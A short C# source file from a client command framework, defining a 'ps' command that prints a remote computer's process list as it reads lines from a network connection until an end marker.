using System;
using System.Collections.Generic;
using Client.Commands.Core;

namespace Client.Commands
{
    internal class ListProcesses : IClientCommand
    {
        public string name { get; } = "ps";

        public string description { get; } = "Displays a list of all processes on the remote computer";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public void Process(List<string> args)
        {
            var data = "";
            while (data != "{end}")
            {
                if(data != "")
                    Console.WriteLine(data);
                data = ClientCommandsManager.networkManager.ReadLine();
            }
        }
    }
}
